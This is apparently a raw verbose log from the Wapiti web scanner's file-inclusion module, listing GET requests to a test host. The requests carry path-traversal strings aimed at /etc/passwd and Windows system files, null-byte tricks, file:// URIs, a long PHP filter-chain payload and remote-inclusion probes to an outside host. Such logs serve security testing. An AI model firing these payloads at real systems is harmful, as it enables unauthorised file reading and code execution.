2024-03-21 15:48:39.439 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:41.219 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:42.944 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:44.673 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:46.386 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:48.093 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:49.790 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:51.466 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:53.162 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:54.855 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:56.563 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:58.320 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:00.050 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:01.809 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:03.578 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:05.309 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:07.027 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:08.751 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:10.479 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:12.198 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:13.909 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:15.636 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:17.340 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:19.052 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:20.742 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:22.454 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:24.173 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:25.893 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:27.609 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=file%3A%2F%2F%2Fetc%2Fpasswd&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:29.329 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:31.056 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:32.768 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:34.472 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:36.177 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:37.927 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:39.642 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:49:41.352 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&hc_action=delete_xml (0)
2024-03-21 15:49:43.072 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&hc_action=delete_xml (0)
2024-03-21 15:49:44.780 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=%2Fetc%2Fpasswd&hc_action=delete_xml (0)
2024-03-21 15:49:46.485 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=%2Fetc%2Fpasswd%00&hc_action=delete_xml (0)
2024-03-21 15:49:48.204 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=%2Fetc%2Fservices&hc_action=delete_xml (0)
2024-03-21 15:49:49.919 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=%2Fetc%2Fservices%00&hc_action=delete_xml (0)
2024-03-21 15:49:51.637 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&hc_action=delete_xml (0)
2024-03-21 15:49:53.345 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&hc_action=delete_xml (0)
2024-03-21 15:49:55.046 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&hc_action=delete_xml (0)
2024-03-21 15:49:56.758 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&hc_action=delete_xml (0)
2024-03-21 15:49:58.465 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&hc_action=delete_xml (0)
2024-03-21 15:50:00.184 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&hc_action=delete_xml (0)
2024-03-21 15:50:01.884 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&hc_action=delete_xml (0)
2024-03-21 15:50:03.604 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&hc_action=delete_xml (0)
2024-03-21 15:50:05.316 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&hc_action=delete_xml (0)
2024-03-21 15:50:07.026 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&hc_action=delete_xml (0)
2024-03-21 15:50:08.733 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&hc_action=delete_xml (0)
2024-03-21 15:50:10.448 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&hc_action=delete_xml (0)
2024-03-21 15:50:12.158 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&hc_action=delete_xml (0)
2024-03-21 15:50:13.874 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&hc_action=delete_xml (0)
2024-03-21 15:50:15.583 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&hc_action=delete_xml (0)
2024-03-21 15:50:17.276 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&hc_action=delete_xml (0)
2024-03-21 15:50:18.995 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&hc_action=delete_xml (0)
2024-03-21 15:50:20.703 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&hc_action=delete_xml (0)
2024-03-21 15:50:22.411 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&hc_action=delete_xml (0)
2024-03-21 15:50:24.127 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&hc_action=delete_xml (0)
2024-03-21 15:50:25.824 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=fuzz&result=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHI